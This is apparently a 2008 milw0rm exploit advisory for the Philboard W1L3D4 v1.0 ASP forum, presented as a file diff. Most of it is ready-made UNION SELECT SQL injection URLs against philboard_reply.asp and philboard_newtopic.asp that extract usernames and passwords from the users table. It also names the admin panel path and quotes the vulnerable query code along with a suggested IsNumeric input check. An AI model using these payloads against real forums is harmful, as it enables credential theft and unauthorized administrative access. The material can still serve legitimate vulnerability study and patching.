@@ -1,0 +1,88 @@
+Philboard W1L3D4 v1.0  Multiple SQL İnjection Vulnerable
+
+Author : U238 
+
+mail   : setuid.noexec0x1[aq]hotmail[dot]com
+
+webpage: http://noexec.blogspot.com
+
+
+Script : http://www.aspindir.com/Goster/4703
+
+Script2: http://rapidshare.de/files/39107179/philboardtrge.zip.html
+
+-_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_
+
+
+[0x1] Exploit:
+
+http://localhost:2222/lab/philboard/philboard_reply.asp?id=1+union+select+0,1,2,3,4,5,6,7,8,username,1,9,0,1,2+from+users
+
+http://localhost:2222/lab/philboard/philboard_reply.asp?id=1+union+select+0,1,2,3,4,5,6,7,8,password,1,9,0,1,2+from+users
+
+*
+http://localhost:2222/lab/philboard/philboard_reply.asp?topic=1+union+select+0,username,2,3,4,5,6+from+users
+
+http://localhost:2222/lab/philboard/philboard_reply.asp?topic=1+union+select+0,password,2,3,4,5,6+from+users
+
+
+
+-----------------------
+
+
+http://localhost:2222/lab/philboard/philboard_newtopic.asp?forumid=1+union+select+0,password,2,3,4,5+from+users
+
+http://localhost:2222/lab/philboard/philboard_newtopic.asp?forumid=1+union+select+0,username,2,3,4,5+from+users
+
+
+-_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_--_--_-_-
+
+[0x2] Admin Panel
+
+
+target/philboard/philboard_admin.asp
+
+
+
+
+
+[0x3] Error File : 
+
+philboard_newtopic.asp
+
+philboard_reply.asp
+
+
+[0x3] Error Code : 
+
+
+id = Request.QueryString("id")
+
+recordnum = Request.QueryString("recordnum")
+
+sql = "SELECT replies.*, forums.*, topics.locked FROM (forums INNER JOIN topics ON forums.forumid = topics.forum) INNER JOIN replies ON topics.id = replies.root WHERE replies.id = " & id
+
+
+
+
+                                     [-] Patched ? [-] 
+
+id = Request.QueryString("id")
+IF Not IsNumeric(request.querystring("id")) THEN
+Response.write "sql injection mu arıyon yawrucum,anam? !!" 
+Response.End
+END IF
+
+* This Code  , application make to included error file.. 
+
+
+
+
+------------------------------
+[0x4] Greatz: The_BekiR - ka0x - Ferruh Mavituna - fahn - sersak
+
+[0x5] U238 | Web - Designer Developer Solutions
+
+-----------------------------
+
+# milw0rm.com [2008-04-20]
